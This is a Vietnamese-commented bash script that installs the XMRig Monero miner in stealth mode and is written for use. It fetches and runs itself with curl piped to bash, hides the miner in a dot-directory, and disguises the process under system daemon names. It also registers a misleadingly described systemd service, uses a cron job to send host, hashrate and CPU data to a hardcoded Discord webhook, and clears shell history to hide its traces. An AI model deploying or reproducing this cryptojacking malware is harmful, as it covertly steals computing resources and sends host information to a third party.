#!/bin/bash
# ghi hết đoạn dưới này ( nhớ bỏ dấu "#" )

# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)

# ========== CONFIG ==========
WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
POOL="pool.hashvault.pro:443"
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
WORKER="stealth_$(hostname)"

CPU_THREADS=$(nproc)  # thay vì 90%
PRIORITY=5

FAKE_NAME=$(shuf -n1 -e "dbus-daemon" "systemd-journald" "udevd" "sys-cleaner" "cronlog")
INSTALL_DIR="$HOME/.local/share/.system"
SERVICE_NAME=$(shuf -n1 -e "sysdaemon" "core-logger" "netwatchd" "usb-handler")
LOG_FILE="/tmp/.core-log.txt"
# ============================

echo "🛠️ Đang cài đặt XMRig stealth (không dùng processhider)..."

# Cài gói cần thiết
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl

# Bật HugePages để tăng tốc
sudo sysctl -w vm.nr_hugepages=128
sudo bash -c 'echo "vm.nr_hugepages=128" >> /etc/sysctl.conf'

# Clone & build XMRig
cd ~
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$TOTAL_CORES

# Tạo thư mục ẩn & copy file
mkdir -p "$INSTALL_DIR"
cp ~/xmrig/build/xmrig "$INSTALL_DIR/xmrig"
chmod +x "$INSTALL_DIR/xmrig"

# Tạo script runner dùng exec -a để ngụy trang tiến trình
tee "$INSTALL_DIR/$FAKE_NAME" > /dev/null << EOF
#!/bin/bash
exec -a $FAKE_NAME "$INSTALL_DIR/xmrig" -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
  --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 \\
  --log-file=$LOG_FILE
EOF

chmod +x "$INSTALL_DIR/$FAKE_NAME"

# Tạo systemd service
sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null << EOF
[Unit]
Description=System Monitor Daemon
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$FAKE_NAME
Restart=always
Nice=0

[Install]
WantedBy=multi-user.target
EOF

# Kích hoạt & chạy service
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_NAME
sudo systemctl start $SERVICE_NAME

# Tạo script gửi log Discord
tee "$INSTALL_DIR/logger.sh" > /dev/null << EOF
#!/bin/bash
WEBHOOK="$DISCORD_WEBHOOK"
PROCESS_NAME="$FAKE_NAME"
HOST="\$(hostname)"
HASHRATE="Unknown"
LOG_FILE="$LOG_FILE"

if [ -f "\$LOG_FILE" ]; then
  HASHRATE=\$(grep -i "speed" "\$LOG_FILE" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
fi

CPU_USAGE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
UPTIME=\$(uptime -p)
THREADS=\$(nproc)

curl -s -H "Content-Type: application/json" -X POST -d "{
  \\"username\\": \\"XMRig Stealth\\",
  \\"content\\": \\"🖥️ \\\`\$HOST\\\` đang đào XMR\\n🔧 Process: \\\`$FAKE_NAME\\\`\\n🧵 Threads: \\\`\$THREADS\\\`\\n⚡ Hashrate: \\\`\$HASHRATE\\\`\\n💻 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n🕒 Uptime: \\\`\$UPTIME\\\`\\"
}" "\$WEBHOOK" > /dev/null 2>&1
EOF

chmod +x "$INSTALL_DIR/logger.sh"

# Cron gửi log mỗi 5 phút
(crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logger.sh") | crontab -

# Gửi log lần đầu
"$INSTALL_DIR/logger.sh"

# Xoá dấu vết
cd ~
rm -rf xmrig
history -c

echo ""
echo "✅ Đã cài đặt XMRig stealth không cần processhider! Log gửi về Discord mỗi 5 phút 🚀"
